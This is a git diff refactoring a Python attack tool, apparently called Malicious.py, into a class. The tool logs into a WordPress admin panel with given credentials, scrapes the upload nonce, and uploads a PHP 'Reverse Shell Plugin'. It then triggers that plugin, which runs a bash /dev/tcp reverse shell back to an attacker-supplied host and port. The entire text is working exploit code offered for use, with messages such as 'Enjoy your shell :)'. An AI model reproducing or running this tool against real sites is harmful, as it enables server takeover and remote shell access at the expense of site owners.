@@ -28,145 +28,141 @@ password_value = args.password
 LHOST = args.LHOST
 LPORT = args.LPORT
 
-payload = f"""<?php
-/**
-* Plugin Name: Reverse Shell Plugin
-* Plugin URI:
-* Description: Reverse Shell Plugin
-* Version: 1.0
-* Author: This is a copy, bruh
-* Author URI: http://www.sevenlayers.com
-*/
-exec("/bin/bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'");
-?>"""
 
-nonce_pattern = 'value="[0-9a-z]{10}"'                                      #PATTERN TO LOOK FOR
-headers = {'user-agent': "Linux Mozilla 5/0", 'Accept-Encoding' : 'none'}   #HEADERS FOR DATA REQUESTS
-shell_directory = (''.join(choice(ascii_lowercase) for i in range(7)))      #RANDOM DIRECTORY TO STORE THE SHELL
-activate_shell = f"{host}/wp-content/plugins/{shell_directory}/shell.php"   #REVERSE_SHELL LOCATION IN URL
+class Exploit:
 
+    payload = f"""<?php
+    /**
+    * Plugin Name: Reverse Shell Plugin
+    * Plugin URI:
+    * Description: Reverse Shell Plugin
+    * Version: 1.0
+    * Author: This is a copy, bruh
+    * Author URI: http://www.sevenlayers.com
+    */
+    exec("/bin/bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'");
+    ?>"""
 
-def Upload_plugin(SESSION,nonce):
-
-    #CREATE PLUGIN
-
-    f = open("shell.php", "w")
-    f.write(payload)
-    f.close()
-    ZIP = ZipFile("rev.zip", 'w')
-    ZIP.write("shell.php")
-    ZIP.close()
-
-    remove("shell.php")
-
-    #CREATE POST REQUEST TO UPLOAD FILE
-
-    file = {
-        "pluginzip": (shell_directory+".zip", open("rev.zip", "rb")),
-        'install-plugin-submit': (None,'Install Now'),
-        '_wpnonce': (None, nonce),
-        '_wp_http_referer': (None, host + '/wp-admin/plugin-install.php?tab=upload'),
-        'install-plugin-submit': (None,'Install Now')
-    }
-
-    #SEND UPLOAD REQUEST
-
-    print("***" * 15)
-    print("[+] Uploading Malicious Plugin...")
-    print("***" * 15 + "\n")
-
-    try:
-        SESSION.post(
-            url=host + "/wp-admin/update.php?action=upload-plugin",
-            files=file,
-            headers=headers,
-            verify=False,
-            timeout=30
-        )
-        remove("rev.zip")
-
-    #IN CASE OF TIMEOUT OR CONNECTION FAIL, MANUALLY OPEN THE URL LINK TO RECEIVE CONNECTION
-
-    except Exception:
-
-        remove("rev.zip")
-        print(color("[✓] Plugin installed successfully\n", "white", attrs=["bold"]))
-        print("[!] If you don't get the shell connection, manually trigger the URL:\n")
-        print("***" * 20)
-        print(activate_shell)
-        print("***" * 20 + "\n")
+    nonce_pattern = 'value="[0-9a-z]{10}"'                                      
+    headers = {'user-agent': "Linux Mozilla 5/0", 'Accept-Encoding' : 'none'}
+    shell_directory = (''.join(choice(ascii_lowercase) for i in range(7)))
+    activate_shell = f"{host}/wp-content/plugins/{shell_directory}/shell.php"
 
 
-def main(username, password):
+    def Upload_plugin(self,session,nonce):
 
-    session = Session()   #SAVE SESSION IN WORDPRESS TARGET
+        f = open("shell.php", "w")
+        f.write(self.payload)
+        f.close()
+        ZIP = ZipFile("rev.zip", 'w')
+        ZIP.write("shell.php")
+        ZIP.close()
 
-    try:
-        if session.get(url=host + "/wp-login.php").status_code == 200:
-            try_login = session.post(
+        remove("shell.php")
 
-                url=host + "/wp-login.php",
-                data={"log": username, "pwd": password, 'redirect_to': host + '/wp-admin/'},
-                headers=headers,
-                allow_redirects=False,
+        file = {
+            "pluginzip": (self.shell_directory+".zip", open("rev.zip", "rb")),
+            'install-plugin-submit': (None,'Install Now'),
+            '_wpnonce': (None, nonce),
+            '_wp_http_referer': (None, host + '/wp-admin/plugin-install.php?tab=upload'),
+            'install-plugin-submit': (None,'Install Now')
+        }
+
+        print("***" * 15)
+        print("[+] Uploading Malicious Plugin...")
+        print("***" * 15 + "\n")
+
+        try:
+            session.post(
+                url=host + "/wp-admin/update.php?action=upload-plugin",
+                files=file,
+                headers=self.headers,
                 verify=False,
-                timeout=12
+                timeout=30
             )
+            remove("rev.zip")
 
-            #CHECK IF LOGIN REQUEST WAS SUCESSFULL
+        except Exception:
 
-            if "The password you entered for the username" not in try_login.text \
-                and "is not registered on this site." not in try_login.text:
+            remove("rev.zip")
+            print(color("[✓] Plugin installed successfully\n", "white", attrs=["bold"]))
+            print("[!] If you don't get the shell connection, manually trigger the URL:\n")
+            print("***" * 20)
+            print(self.activate_shell)
+            print("***" * 20 + "\n")
 
-                    print("===" * 20)
-                    print("[+] Logged in successfully (preparing to upload...)")
-                    print("===" * 20 + "\n")
-                    print("---" * 15)
-                    print("[+] Creating Plugin...")
-                    print("---" * 15 + "\n")
+    
+    def exploit(self,session):
 
-                    find_install_dir = session.get(
-                        url=host + "/wp-admin/plugin-install.php?tab=upload",
-                        headers=headers,
-                        verify=False,
-                        timeout=35
-                    )
+        find_install_dir = session.get(
+            url=host + "/wp-admin/plugin-install.php?tab=upload",
+            headers=self.headers,
+            verify=False,
+            timeout=35
+        )
 
-                    #RUN REVERSE SHELL CODE IF PLUGIN DIRECTORY IS AVAILABLE
+        if find_install_dir.status_code == 200:
 
-                    if find_install_dir.status_code == 200:
+            try:
+                search_nonce = search(self.nonce_pattern, find_install_dir.text)
+                last = search("[0-9a-z]{10}", search_nonce.group(0))
+                nonce = last.group(0)
 
-                        try:
-                            search_nonce = search(nonce_pattern, find_install_dir.text)
-                            last = search("[0-9a-z]{10}", search_nonce.group(0))
-                            nonce = last.group(0)
+                self.Upload_plugin(session,nonce)
+                print("Enjoy your shell :)\n")
+                session.get(url=self.activate_shell, verify=False, timeout=30)
 
-                            Upload_plugin(session,nonce)
-                            print("Enjoy your shell :)\n")
-                            session.get(url=activate_shell, verify=False, timeout=30)
-
-                        except AttributeError:
-                            print("[!] Just remove the character: '/' in the end or check the URL" + "\n")
-                            exit()
-
-                    else:
-                        print("===" * 15)
-                        return "\n[X] The Fuck? Could not find <plugin-install.php> in the target dashboard?!\n"
-            else:
-                print("===" * 15)
-                return "\n[X] Login Failed! Check the Credentials\n"
+            except AttributeError:
+                print("[!] Just remove the character: '/' in the end or check the URL" + "\n")
+                exit()
 
         else:
-            return "\n[X] The Fuck? Could not find the login page?!\n"
+            print("===" * 15)
+            print("\n[X] Could not find <plugin-install.php> in the target dashboard?!\n")
 
-    except TimeoutError:
-        print("===" * 15)
-        return "\n[?] Could not connect to the target URL\n"
+
+    def main(self,username,password):
+
+        session = Session()
+
+        try:
+            if session.get(url=host + "/wp-login.php").status_code == 200:
+                try_login = session.post(
+
+                    url=host + "/wp-login.php",
+                    data={"log": username, "pwd": password, 'redirect_to': host + '/wp-admin/'},
+                    headers=self.headers,
+                    allow_redirects=False,
+                    verify=False,
+                    timeout=12
+                )
+
+                if "The password you entered for the username" not in try_login.text \
+                    and "is not registered on this site." not in try_login.text:
+
+                        print("===" * 20)
+                        print("[+] Logged in successfully (preparing to upload...)")
+                        print("===" * 20 + "\n")
+                        print("---" * 15)
+                        print("[+] Creating Plugin...")
+                        print("---" * 15 + "\n")
+
+                        self.exploit(session)
+                else:
+                    print("===" * 15)
+                    return "\n[X] Login Failed! Check the Credentials\n"
+
+            else:
+                return "\n[X] Could not find the login page?!\n"
+
+        except TimeoutError:
+            print("===" * 15)
+            return "\n[?] Could not connect to the target URL\n"
 
 
 if __name__ == '__main__':
 
-    #IF ALL PARAMETERS HAVE RECEIVED VALUES, THE SCRIPT EXECUTES
+    run = Exploit()
 
     try:
         if host is not None and username_value is not None and password_value is not None \
@@ -178,7 +174,7 @@ if __name__ == '__main__':
             print("===" * 15)
             print("[+] Starting...")
             print("===" * 15 + "\n")
-            print(main(username_value, password_value))
+            print(run.main(username_value, password_value))
 
         else:
             print("\nUSAGE: python3 Malicious.py -t <TARGET IP OR DOMAIN> -u <USERNAME> -p <PASSWORD> -L <LOCAL IP> -P <LOCAL PORT>\n")
